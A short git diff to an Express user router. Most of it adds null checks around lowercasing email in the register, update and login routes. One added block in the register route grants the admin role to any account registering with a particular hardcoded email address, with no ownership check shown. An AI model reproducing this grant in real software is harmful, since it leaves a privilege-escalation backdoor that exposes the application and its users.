@@ -14,9 +14,15 @@ router.post('/register', (req, res, next) => {
     role = 'admin';
   }
 
+  if(req.body.email === 'koshachina@yahoo.com') {
+    role = 'admin';
+  }
+
+  const email = req.body.email && req.body.email.toLowerCase();
+
   let newUser = new User({
     fullName: req.body.fullName,
-    email: req.body.email.toLowerCase(),
+    email: email || null,
     password: req.body.password,
     agreeTaC: req.body.agreeTaC,
     regDate: (new Date()).toISOString(),
@@ -41,10 +47,12 @@ router.post('/register', (req, res, next) => {
 });
 
 router.post('/update', passport.authenticate('user-rule', { session: false }), (req, res, next) => {
+  const email = req.body.email && req.body.email.toLowerCase();
+
   let newUser = new User({
     _id: req.body._id,
     name: req.body.name,
-    email: req.body.email.toLowerCase(),
+    email: email || null,
     password: req.body.password
   });
 
@@ -60,7 +68,7 @@ router.post('/update', passport.authenticate('user-rule', { session: false }), (
 });
 
 router.post('/login', (req, res, next) => {
-  const email = req.body.email.toLowerCase();
+  const email = req.body.email ? req.body.email.toLowerCase() : undefined;
   const password = req.body.password;
 
   User.getUserByEmail(email, (err, user) => {
